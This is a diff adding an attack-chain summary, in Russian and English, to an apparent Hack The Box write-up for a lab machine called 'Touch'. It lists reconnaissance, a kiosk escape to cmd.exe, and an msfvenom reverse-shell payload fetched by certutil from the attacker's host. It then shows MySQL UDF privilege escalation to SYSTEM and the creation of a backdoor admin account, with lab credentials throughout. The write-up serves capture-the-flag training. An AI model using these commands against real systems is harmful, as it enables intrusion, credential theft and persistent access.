@@ -1,3 +1,63 @@
+TOUCH (HTB) — ATTACK CHAIN
+
+Reconnaissance
+├── nmap -sV -sC 10.129.71.63 → 135 (RPC), 3389 (RDP), 5985 (WinRM), 8443 (Nexion DeviceHub)
+├── ffuf /FUZZ → /login (200), /api (403)
+└── ffuf /api/FUZZ → /api/status → serial NX-DH-2024-B7042
+
+Foothold (DeviceHub → RDP)
+├── /login → password = serial (NX-DH-2024-B7042)
+├── Найдены креды: KioskUser / K!0sk2026#
+├── xfreerdp /u:KioskUser /p:'K!0sk2026#' /v:10.129.71.63
+└── Kiosk HTB Airways
+
+Kiosk Escape
+├── Booking Ref: KS7X2M / Last Name: CRAWFORD
+├── DOCUMENT VERIFICATION → Scan → ошибка
+├── DeviceHub → выключить сканер
+├── Scan → новая ошибка с кликабельной ссылкой
+├── Клик → браузер вне киоска
+├── Ctrl+O → C:\Windows\System32\cmd.exe
+└── shell: kiosk-042\kioskuser → type user.txt → <USER_FLAG>
+
+Shell Upgrade (Meterpreter)
+├── msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.82 LPORT=4445 -f exe -o shell.exe
+├── python3 -m http.server 8000
+├── msfconsole → multi/handler
+├── certutil -urlcache -split -f http://10.10.14.82:8000/shell.exe C:\Users\KioskUser\Desktop\shell.exe
+└── shell.exe → Meterpreter session
+
+Privilege Check
+├── getuid → KIOSK-042\KioskUser
+├── sysinfo → Windows 11 24H2+ (Build 26100)
+├── whoami /priv → без SeImpersonatePrivilege
+└── whoami /groups → Printer Administrators, RDP Users, Users
+
+Enumeration (Source Code)
+├── C:\Program Files\HTB Airways\Kiosk\ (Node/Express/React)
+├── C:\Program Files\Nexion Systems\DocReader\ (.NET DeviceHub)
+├── C:\Program Files\Nexion Systems\Printer\
+├── C:\MySQL\ (MySQL Server 8.0)
+├── document-service.ts → OCR MRZ (tesseract.js)
+├── staff.ts → QR HTBAW-STAFF:<email>:<authCode>
+├── database/index.ts → kiosk_app:K!0sk_R3pl1ca#DB
+└── MySQL → SELECT * FROM _htb_staff
+
+Credential Leak (MySQL root)
+├── C:\ProgramData\HTB Airways\db-config.ini
+├── C:\ProgramData\HTB Airways\refresh-dates.bat
+│   └── -u root -pHTB@irw4ys_DB!2026
+├── SELECT user, host, Grant_priv, File_priv FROM mysql.user → root:Y:Y
+└── icacls C:\MySQL\lib\plugin → Authenticated Users:(M)
+
+Privilege Escalation (MySQL UDF Hijacking)
+├── meterpreter upload lib_mysqludf_sys_64.dll → C:\MySQL\lib\plugin\
+├── CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll'
+├── SELECT sys_eval('whoami') → nt authority\system
+├── SELECT sys_eval('type C:\Users\Administrator\Desktop\root.txt') → <ROOT_FLAG>
+└── Опционально: net user hacker /add → Administrators → RDP/WinRM
+
+
 0. Machine Briefing
 
 В описании машины **Layover** (предшествующей) были найдены имя и код бронирования, которые пригодятся здесь:
